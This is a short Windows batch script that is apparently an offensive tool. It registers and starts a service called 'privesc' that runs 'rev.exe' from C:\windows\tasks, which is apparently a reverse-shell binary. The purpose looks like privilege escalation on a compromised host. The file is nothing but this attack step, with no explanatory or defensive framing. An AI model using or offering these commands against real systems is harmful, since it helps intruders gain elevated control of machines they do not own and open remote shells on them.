@ECHO OFF
sc create privesc binPath= "C:\windows\tasks\rev.exe"
sc start privesc

